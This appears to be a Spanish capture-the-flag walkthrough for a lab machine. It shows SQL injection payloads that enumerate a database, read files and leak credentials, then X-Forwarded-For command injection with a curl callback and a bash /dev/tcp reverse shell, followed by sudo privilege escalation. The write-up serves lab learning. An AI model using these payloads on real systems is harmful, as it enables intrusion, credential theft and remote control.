PORT   STATE SERVICE
80/tcp open  http

-En la web encontramos un Input dónde ponemos un nombre y nos dice si ha sido elegido para jugar un torneo o no.

-Interceptamos la petición con BurpSuite para ver cómo funciona:
	POST /index.php
	player=Sergio
		-Respuesta:
			**Congratulations sergio you may compete in this tournament!**

-Probamos una **SQLI Simple** para ver como Responde:
	POST /index.php
	player=Sergio'or 1=1-- -
		-Respuesta:
			**Sorry, ippsec you are not eligible due to already qualifying.**
			(Nos ha devuelto el Nombre de otro Usuario, **es Vulnerable a SQLI**)

## SQLI - DB Enumeration

-Con 'Order by' no conseguimos ver nada, pero con 'Union select' FUNCIONA:
	POST /index.php
	player=Sergio'union select 1-- -
		**Sorry, 1** you are not eligible due to already qualifying.
			**(Tiene Solo 1 Columna)**

**-Listamos Todas las BDS:**
	POST /index.php
	player=Sergio'union select GROUP_CONCAT(schema_name) FROM information_schema.schemata-- -
		Sorry, **mysql,information_schema,performance_schema,sys,november** you are not eligible due to already qualifying.

**-Listamos las Tablas de la BD 'November':**
	POST /index.php
	player=Sergio'union select GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='november'-- -
		Sorry, **flag,players** you are not eligible due to already qualifying.

**-Listamos Columnas de la Tabla 'flag':**
	POST /index.php
	player=Sergio'union select GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='flag'-- -
		Sorry, **one** you are not eligible due to already qualifying.

-Listamos el Contenido de la Columna 'one':
	POST /index.php
	player=Sergio'union select one FROM november.flag-- -
		Sorry, **UHC{F1rst_5tep_2_Qualify}** you are not eligible due to already qualifying.
-------------------------------------------------------------------------------------------------------------

-Introducimos la Flag en esta ruta y nos dicen lo siguiente:
	/challenge.php
		-Submit de Flag Here:
			{F1rst_5tep_2_Qualify}
				**Your IP Address has now been granted SSH Access.**

-Volvemos a hacer un escaneo de Puertos y ahora está abierto el Puerto 22 (SSH)
	PORT   STATE SERVICE
	22/tcp open  ssh
	80/tcp open  http


## Acceso a la Máquina (2 ways)

#### 1-HTTP Header Command Injection X-Forwarded-For RCE

-A través del SQLI, vemos el Código Fuente del Archivo 'Firewall.php':
	POST /index.php
	player=sergio'union select load_file("/var/www/html/firewall.php")-- -
		<?php
			  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
			    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
			  } else {
			    $ip = $_SERVER['REMOTE_ADDR'];
			  };
			  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
		?>
(Está guardando el Contenido del Header 'HTTP_X_FORWARDED_FOR' en la Variable '$IP' para Darnos Acceso a SSH jugando con 'IPTABLES' y luego está Ejecutando un Comando con 'system')

-Probamos a Aplicar **Command Injection** y conseguir **RCE** a través del **HEADER**:
	GET /firewall.php
	**X-Forwarded-For: 127.0.0.1;id**    (Añadimos el Header manualmente)
		-**NO VEMOS** el Output del Comando

-Probamos a hacer una Petición a nuestro Servidor por si es **Blind Command Injection**:
	GET /firewall.php
	**X-Forwarded-For: 127.0.0.1;curl http://10.10.14.36/**
		"GET / HTTP/1.1" 200 - 
		(RECIBIMOS LA PETICIÓN!!)


-Nos mandamos una RS con Bash:
	GET /firewall.php
	X-Forwarded-For:10.10.14.36;bash -c 'bash -i >& /dev/tcp/10.10.14.36/1234 0>&1'
		**www-data@union:~/html$ whoami**
			**www-data**
#### 2-SQLI - DB Enumeration 2 - SSH Conection

-Listamos los nombres de lo jugadores, que son posibles usuarios:
	POST /index.php
	player=Sergio'union select GROUP_CONCAT(player) FROM november.players-- -
		Sorry, **ippsec,celesian,big0us,luska,tinyboy** you are not eligible due to already qualifying.

-Nos hay ninguna Tabla con Contraseñas, probamos a **leer el Código Fuente** de los Archivos que conocemos:
	POST /index.php
	player='union select load_file("/var/www/html/index.php")-- -
		-Datos importantes de la Respuesta:
			require('config.php'); **(Hay un Archivo 'config.php')**
			// SQLMap Killer
				-Código de un Filtro que impide que usemos SQLMAP (Por eso no funcionaba)

-Listamos el Código Fuente del Archivo **'config.php'**:
	POST /index.php
	player='union select load_file("/var/www/html/config.php")-- -
		**$username = "uhc";**
		**$password = "uhc-11qual-global-pw";**
			**(Credenciales Encontradas!!)**
-------------------------------------------------------------------------------------------------------------

-Nos autenticamos por SSH con las credenciales encontradas:
	-ssh ihc@10.10.11.128
	-Password: uhc-11qual-global-pw
		**uhc@union:~$ whoami**
			**uhc**

## Escalada de Privilegios

-Si entramos vía web (Command Injection), entramos como www-data y tenemos estos permisos Sudoers:
	-sudo -l
		(ALL : ALL) NOPASSWD: ALL
	-sudo su
		root@union:/# whoami
			root

-Si entramos por SSH, abusamos de /ust/bin/pkexec con permisos SUID